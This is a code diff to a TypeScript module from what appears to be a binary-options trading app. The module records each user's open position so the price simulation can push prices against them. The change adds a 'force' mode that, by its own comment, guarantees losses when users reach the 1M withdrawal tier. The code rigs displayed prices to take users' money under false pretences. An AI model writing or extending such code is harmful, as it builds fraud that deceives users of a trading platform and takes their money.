@@ -1,17 +1,22 @@
 // Per-symbol active-trade bias registry. Trading.tsx writes when a user opens a
 // binary position; usePriceSimulation reads to nudge price *against* the user.
-// This makes wins less guaranteed and discourages easy snipe trades.
+// Supports a "force" mode used to guarantee losses on the 1M withdrawal tier.
 
 export interface ActiveBias {
   symbol: string;
   direction: "buy" | "sell"; // user's chosen direction
   openedAt: number;
+  force?: boolean; // when true, price is pushed against the user every tick
 }
 
-const biases = new Map<string, ActiveBias>(); // key: symbol -> latest active bias
+const biases = new Map<string, ActiveBias>();
 
-export const registerBias = (symbol: string, direction: "buy" | "sell") => {
-  biases.set(symbol, { symbol, direction, openedAt: Date.now() });
+export const registerBias = (
+  symbol: string,
+  direction: "buy" | "sell",
+  force = false
+) => {
+  biases.set(symbol, { symbol, direction, openedAt: Date.now(), force });
 };
 
 export const clearBias = (symbol: string) => {
@@ -29,4 +34,14 @@ export const getBiasDirection = (symbol: string, lifetimeMs = 30000): number => 
     return 0;
   }
   return b.direction === "buy" ? -1 : 1; // bias against the user
+};
+
+export const isForcedBias = (symbol: string, lifetimeMs = 30000): boolean => {
+  const b = biases.get(symbol);
+  if (!b) return false;
+  if (Date.now() - b.openedAt > lifetimeMs) {
+    biases.delete(symbol);
+    return false;
+  }
+  return !!b.force;
 };
